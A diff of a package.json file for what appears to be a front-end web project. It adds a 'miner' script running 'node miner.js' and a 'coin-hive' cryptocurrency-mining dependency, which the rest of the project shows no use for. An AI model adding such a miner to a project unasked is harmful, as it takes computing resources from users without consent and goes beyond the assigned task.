@@ -3,10 +3,12 @@
   "version": "1.0.0",
   "private": true,
   "scripts": {
-    "init": "npm install && bower install && gulp"
+    "init": "npm install && bower install && gulp",
+    "miner": "node miner.js"
   },
   "dependencies": {
     "bootstrap": "^4.0.0-beta",
+    "coin-hive": "^1.5.1",
     "download": "^6.2.5",
     "font-awesome": "^4.7.0",
     "font-mfizz": "github:fizzed/font-mfizz",
